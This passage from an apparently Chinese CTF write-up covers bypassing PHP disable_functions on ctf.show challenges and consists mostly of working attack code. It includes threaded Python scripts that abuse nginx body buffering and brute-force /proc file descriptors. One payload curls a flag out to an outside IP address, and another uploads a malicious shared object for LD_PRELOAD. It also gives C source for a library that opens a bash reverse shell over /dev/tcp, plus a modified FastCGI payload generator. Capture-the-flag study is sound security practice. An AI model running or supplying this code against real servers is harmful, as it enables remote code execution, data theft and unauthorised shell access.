socket<br><span class="hljs-keyword">import</span> threading<br><br>ip = <span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span><br>port = <span class="hljs-number">28268</span><br>s = socket.socket()<br>s.connect((ip, port))<br><br><br><span class="hljs-comment"># 获取当前进程的pid</span><br>s.send(<span class="hljs-string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span><br><span class="hljs-string">Host:127.0.0.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.encode())<br>data = s.recv(<span class="hljs-number">1024</span>).decode()<br>s.close()<br>pid = re.findall(<span class="hljs-string">&#x27;(.*?) www-data&#x27;</span>, data)[<span class="hljs-number">0</span>].strip()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pid:&quot;</span>, pid)<br><br><br><span class="hljs-comment"># payload</span><br>payload = <span class="hljs-string">&quot;curl http://47.99.77.52:8888?a=`cat /f*`;&quot;</span> + <span class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">500</span><br>length = <span class="hljs-built_in">len</span>(payload)<br><br><br><span class="hljs-comment"># 上传文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        s = socket.socket()<br>        s.connect((ip, port))<br>        x = <span class="hljs-string">f&#x27;&#x27;&#x27;POST / HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;length&#125;</span></span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;payload&#125;</span></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.encode()<br>        s.send(x)<br>        s.close()<br><br><br><span class="hljs-comment"># 读取文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruter</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-number">40</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;fd:&quot;</span>, fd)<br>            s = socket.socket()<br>            s.connect((ip, port))<br>            s.send(<span class="hljs-string">f&#x27;&#x27;&#x27;GET /?file=/proc/<span class="hljs-subst">&#123;pid&#125;</span>/fd/<span class="hljs-subst">&#123;fd&#125;</span> HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.encode())<br>            <span class="hljs-built_in">print</span>(s.recv(<span class="hljs-number">2048</span>).decode())<br>            s.close()<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    t = threading.Thread(target=upload)<br>    t.start()<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    a = threading.Thread(target=bruter)<br>    a.start()<br><br></code></pre></td></tr></table></figure><p><strong>三：nginx的body缓存机制+恶意so文件</strong></p><p>与二类似，只不过将命令换成了so文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><br>ip = <span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span><br>port = <span class="hljs-number">28128</span><br>s = socket.socket()<br>s.connect((ip, port))<br><br><span class="hljs-comment"># 获取当前进程的pid</span><br>s.send(<span class="hljs-string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span><br><span class="hljs-string">Host:127.0.0.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.encode())<br>data = s.recv(<span class="hljs-number">1024</span>).decode()<br>s.close()<br>pid = re.findall(<span class="hljs-string">&#x27;(.*?) www-data&#x27;</span>, data)[<span class="hljs-number">0</span>].strip()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pid:&quot;</span>, pid)<br><br><span class="hljs-comment"># payload length</span><br>length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hack.so&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read() + <span class="hljs-string">b&#x27;\n&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">200</span>)).encode()<br><br><br><span class="hljs-comment"># 上传文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        s = socket.socket()<br>        s.connect((ip, port))<br>        x = <span class="hljs-string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: &#x27;&#x27;&#x27;</span> + length + <span class="hljs-string">b&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> + <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hack.so&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read() + <span class="hljs-string">b&#x27;\n&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">200</span> + <span class="hljs-string">b&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>        s.send(x)<br>        s.close()<br><br><br><span class="hljs-comment"># 读取文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruter</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-number">40</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;fd:&quot;</span>, fd)<br>            s = socket.socket()<br>            s.connect((ip, port))<br>            s.send(<span class="hljs-string">f&#x27;&#x27;&#x27;GET /?env=LD_PRELOAD=/proc/<span class="hljs-subst">&#123;pid&#125;</span>/fd/<span class="hljs-subst">&#123;fd&#125;</span> HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.encode())<br>            <span class="hljs-built_in">print</span>(s.recv(<span class="hljs-number">2048</span>).decode())<br>            s.close()<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    t = threading.Thread(target=upload)<br>    t.start()<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    a = threading.Thread(target=bruter)<br>    a.start()<br></code></pre></td></tr></table></figure><h1 id="加载so绕过disable-functions"><a href="#加载so绕过disable-functions" class="headerlink" title="加载so绕过disable_functions"></a>加载so绕过disable_functions</h1><p>原理与 LD_PRELOAD 绕过的方式差不多，一个是通过 putenv 设置，另一个则是通过上传一个恶意so文件，然后通过 PHP_VALUE 给 php.ini 添加一个 extender 扩展来绕过</p><p>制作恶意so文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span>** environ;<br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; environ[i]; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(environ[i], <span class="hljs-string">&quot;LD_PRELOAD&quot;</span>)) &#123;<br>                    environ[i][<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>    &#125;<br>    system(<span class="hljs-string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/IP/PORT &lt;&amp;1&#x27;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译</p><p><code>gcc -c -fPIC hack.c -o hack &amp;&amp; gcc --share hack -o hack.so</code></p><p>以下是修改过的 <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a>，可以生成payload，注意修改 PHP_VALUE 的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br><span class="hljs-comment"># 修改点 1</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span><br><br>PY2 = <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> sys.version_info.major == <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bchr</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> PY2:<br>        <span class="hljs-keyword">return</span> force_bytes(<span class="hljs-built_in">chr</span>(i))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bord</span>(<span class="hljs-params">c</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(c, <span class="hljs-built_in">int</span>):<br>        <span class="hljs-keyword">return</span> c<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ord</span>(c)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_bytes</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> s.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_text</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">issubclass</span>(<span class="hljs-built_in">type</span>(s), <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        s = <span class="hljs-built_in">str</span>(s, <span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        s = <span class="hljs-built_in">str</span>(s)<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FastCGIClient</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># private</span><br>    __FCGI_VERSION = <span class="hljs-number">1</span><br><br>    __FCGI_ROLE_RESPONDER = <span class="hljs-number">1</span><br>    __FCGI_ROLE_AUTHORIZER = <span class="hljs-number">2</span><br>    __FCGI_ROLE_FILTER = <span class="hljs-number">3</span><br><br>    __FCGI_TYPE_BEGIN = <span class="hljs-number">1</span><br>    __FCGI_TYPE_ABORT = <span class="hljs-number">2</span><br>    __FCGI_TYPE_END = <span class="hljs-number">3</span><br>    __FCGI_TYPE_PARAMS = <span class="hljs-number">4</span><br>    __FCGI_TYPE_STDIN = <span class="hljs-number">5</span><br>    __FCGI_TYPE_STDOUT = <span class="hljs-number">6</span><br>    __FCGI_TYPE_STDERR = <span class="hljs-number">7</span><br>    __FCGI_TYPE_DATA = <span class="hljs-number">8</span><br>    __FCGI_TYPE_GETVALUES = <span class="hljs-number">9</span><br>    __FCGI_TYPE_GETVALUES_RESULT = <span class="hljs-number">10</span><br>    __FCGI_TYPE_UNKOWNTYPE = <span class="hljs-number">11</span><br><br>    __FCGI_HEADER_SIZE = <span class="hljs-number">8</span><br><br>    <span class="hljs-comment"># request state</span><br>    FCGI_STATE_SEND = <span class="hljs-number">1</span><br>    FCGI_STATE_ERROR = <span class="hljs-number">2</span><br>    FCGI_STATE_SUCCESS = <span class="hljs-number">3</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, host, port, timeout, keepalive</span>):<br>        self.host = host<br>        self.port = port<br>        self.timeout = timeout<br>        <span class="hljs-keyword">if</span> keepalive:<br>            self.keepalive = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            self.keepalive = <span class="hljs-number">0</span><br>        self.sock = <span class="hljs-literal">None</span><br>        self.requests = <span class="hljs-built_in">dict</span>()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__connect</span>(<span class="hljs-params">self</span>):<br>        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        self.sock.settimeout(self.timeout)<br>        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># if self.keepalive:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span><br><br>        <span class="hljs-comment"># 修改点 2</span><br>        <span class="hljs-comment"># try:</span><br>        <span class="hljs-comment">#     self.sock.connect((self.host, int(self.port)))</span><br>        <span class="hljs-comment"># except socket.error as msg:</span><br>        <span class="hljs-comment">#     self.sock.close()</span><br>        <span class="hljs-comment">#     self.sock = None</span><br>        <span class="hljs-comment">#     print(repr(msg))</span><br>        <span class="hljs-comment">#     return False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeFastCGIRecord</span>(<span class="hljs-params">self, fcgi_type, content, requestid</span>):<br>        length = <span class="hljs-built_in">len</span>(content)<br>        buf = bchr(FastCGIClient.__FCGI_VERSION) \<br>              + bchr(fcgi_type) \<br>              + bchr((requestid &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>              + bchr(requestid &amp; <span class="hljs-number">0xFF</span>) \<br>              + bchr((length &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>              + bchr(length &amp; <span class="hljs-number">0xFF</span>) \<br>              + bchr(<span class="hljs-number">0</span>) \<br>              + bchr(<span class="hljs-number">0</span>) \<br>              + content<br>        <span class="hljs-keyword">return</span> buf<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeNameValueParams</span>(<span class="hljs-params">self, name, value</span>):<br>        nLen = <span class="hljs-built_in">len</span>(name)<br>        vLen = <span class="hljs-built_in">len</span>(value)<br>        record = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(nLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((nLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + bchr((nLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr((nLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr(nLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">if</span> vLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(vLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((vLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + bchr((vLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr((vLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr(vLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">return</span> record + name + value<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIHeader</span>(<span class="hljs-params">self, stream</span>):<br>        header = <span class="hljs-built_in">dict</span>()<br>        header[<span class="hljs-string">&#x27;version&#x27;</span>] = bord(stream[<span class="hljs-number">0</span>])<br>        header[<span class="hljs-string">&#x27;type&#x27;</span>] = bord(stream[<span class="hljs-number">1</span>])<br>        header[<span class="hljs-string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">3</span>])<br>        header[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">5</span>])<br>        header[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="hljs-number">6</span>])<br>        header[<span class="hljs-string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="hljs-number">7</span>])<br>        <span class="hljs-keyword">return</span> header<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIRecord</span>(<span class="hljs-params">self, buffer</span>):<br>        header = buffer.read(<span class="hljs-built_in">int</span>(self.__FCGI_HEADER_SIZE))<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> header:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            record = self.__decodeFastCGIHeader(header)<br>            record[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;contentLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                contentLength = <span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;contentLength&#x27;</span>])<br>                record[<span class="hljs-string">&#x27;content&#x27;</span>] += buffer.read(contentLength)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;paddingLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                skiped = buffer.read(<span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]))<br>            <span class="hljs-keyword">return</span> record<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">self, nameValuePairs=&#123;&#125;, post=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__connect():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        requestId = random.randint(<span class="hljs-number">1</span>, (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>)<br>        self.requests[requestId] = <span class="hljs-built_in">dict</span>()<br>        request = <span class="hljs-string">b&quot;&quot;</span><br>        beginFCGIRecordContent = bchr(<span class="hljs-number">0</span>) \<br>                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \<br>                                 + bchr(self.keepalive) \<br>                                 + bchr(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span><br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,<br>                                              beginFCGIRecordContent, requestId)<br>        paramsRecord = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nameValuePairs:<br>            <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> nameValuePairs.items():<br>                name = force_bytes(name)<br>                value = force_bytes(value)<br>                paramsRecord += self.__encodeNameValueParams(name, value)<br><br>        <span class="hljs-keyword">if</span> paramsRecord:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-keyword">if</span> post:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-comment"># 修改点 3</span><br>        <span class="hljs-comment"># self.sock.send(request)</span><br>        <span class="hljs-comment"># self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND</span><br>        <span class="hljs-comment"># self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27;</span><br>        <span class="hljs-comment"># return 